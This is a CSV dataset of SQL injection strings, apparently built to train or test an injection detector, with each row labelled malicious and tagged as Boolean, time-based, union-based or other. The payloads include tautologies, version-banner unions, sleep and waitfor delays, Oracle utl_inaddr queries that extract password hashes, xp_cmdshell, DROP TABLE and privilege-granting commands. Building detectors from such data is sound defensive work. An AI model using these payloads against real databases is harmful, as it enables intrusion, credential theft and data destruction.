Query,Label,Attack_Type
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,Boolean-based
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,Time-based
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,Other_Malicious
""" or """" """,1,Other_Malicious
delete,1,Other_Malicious
;waitfor delay '0:0:__TIME__'--,1,Time-based
 or 1  =  1 --,1,Boolean-based
1' and non_existant_table   =   '1,1,Other_Malicious
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,Union-based
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,Other_Malicious
x' AND userid IS NULL; --,1,Other_Malicious
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,Union-based
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,Other_Malicious
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,Boolean-based
UNION ALL SELECT,1,Union-based
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,Boolean-based
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
x' or full_name like '%bob%,1,Other_Malicious
x' and members.email is NULL; --,1,Other_Malicious
 or 2 > 1,1,Other_Malicious
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,Boolean-based
"""  )   or pg_sleep  (  __TIME__  )  --",1,Time-based
 ',1,Other_Malicious
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,Boolean-based
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,Boolean-based
 )   or sleep  (  __TIME__  )    =  ',1,Time-based
sleep 50',1,Other_Malicious
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,Union-based
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,Boolean-based
or sleep  (  __TIME__  )    =  ',1,Time-based
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,Union-based
or 2 > 1,1,Other_Malicious
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,Other_Malicious
anything' OR 'x'  =  'x,1,Other_Malicious
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,Union-based
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,Union-based
&',1,Other_Malicious
a' or 3  =  3--,1,Boolean-based
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
"admin""or 1  =  1 or """"  =  """,1,Boolean-based
uni/**/on sel/**/ect,1,Other_Malicious
""" or """"&""",1,Other_Malicious
 )    )   ;waitfor delay '0:0:__TIME__'--,1,Time-based
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,Boolean-based
1 waitfor delay '0:0:10'--,1,Time-based
bfilename,1,Other_Malicious
admin'  )   or   (  '1'  =  '1'--,1,Other_Malicious
UEf,1,Other_Malicious
 -- &password  = ,1,Other_Malicious
1 or sleep  (  __TIME__  )  #,1,Time-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,Union-based
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,Union-based
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,Other_Malicious
or sleep  (  __TIME__  )  #,1,Time-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,Boolean-based
||6,1,Other_Malicious
or 1/*,1,Other_Malicious
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,Other_Malicious
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,Boolean-based
" or 1  =  1 or """"  =  ",1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,Other_Malicious
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
or 'whatever' in   (  'whatever'  ) ,1,Other_Malicious
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,Other_Malicious
select * from users where id  =  '1'   or 1  =  1 -- 1',1,Boolean-based
?,1,Other_Malicious
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,Other_Malicious
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,Union-based
"admin""  )   or   (  ""1""  =  ""1""#",1,Other_Malicious
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,Boolean-based
 or '' ',1,Other_Malicious
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,Boolean-based
or 1  =  1,1,Other_Malicious
 ; drop table temp --,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,Other_Malicious
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,Time-based
""" or ""x""  =  ""x",1,Other_Malicious
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,Boolean-based
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,Union-based
 or 'something' like 'some%',1,Other_Malicious
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,Time-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,Other_Malicious
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,Boolean-based
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,Other_Malicious
admin' or '1'  =  '1'--,1,Boolean-based
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,Time-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,Union-based
""";waitfor delay '0:0:__TIME__'--",1,Time-based
x' and userid is NULL; --,1,Other_Malicious
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,Boolean-based
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,Boolean-based
’ or ‘1’  =  ’1,1,Other_Malicious
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,Union-based
admin'or 1  =  1 or ''  =  ',1,Boolean-based
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,Union-based
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,Other_Malicious
exec  (  @s  ) ,1,Other_Malicious
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,Union-based
 or 1  =  1,1,Boolean-based
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,Union-based
x' AND email IS NULL; --,1,Other_Malicious
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,Union-based
 --,1,Other_Malicious
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,Union-based
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
update,1,Other_Malicious
 or 1/*,1,Other_Malicious
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,Union-based
"""   )    )    or pg_sleep  (  __TIME__  )  --",1,Time-based
||'6,1,Other_Malicious
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,Union-based
or   (  EXISTS  ) ,1,Other_Malicious
^',1,Other_Malicious
or 'text'   =   n'text',1,Other_Malicious
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,Union-based
 or 0  =  0 --,1,Boolean-based
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,Union-based
password:*/  =  1--,1,Other_Malicious
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,Union-based
" union   (  select NULL,   (  select @@version   )    )    --",1,Other_Malicious
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1. union select null,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,Union-based
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,Other_Malicious
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1,Boolean-based
UNION SELECT,1,Union-based
asc,1,Other_Malicious
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,Other_Malicious
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,Other_Malicious
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1,Union-based
  )   or true--,1,Other_Malicious
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,Other_Malicious
 or userid like '%,1,Other_Malicious
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1,Other_Malicious
/,1,Other_Malicious
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1,Boolean-based
"admin""/*",1,Other_Malicious
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",1,Union-based
 )  ;waitfor delay '0:0:__TIME__'--,1,Time-based
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1,Boolean-based
"admin"" or ""1""  =  ""1",1,Boolean-based
 union   (  select @@version  )   --,1,Other_Malicious
 or ''^',1,Other_Malicious
"""   )    )    or sleep  (  __TIME__  )    =  """,1,Time-based
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,Other_Malicious
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,Union-based
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1,Boolean-based
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1,Boolean-based
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1,Boolean-based
"""hi""""  )   or   (  """"a""""  =  """"a""",1,Other_Malicious
select name from syscolumns where id   =     (  sele ...,1,Other_Malicious
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1,Boolean-based
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1,Time-based
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,Union-based
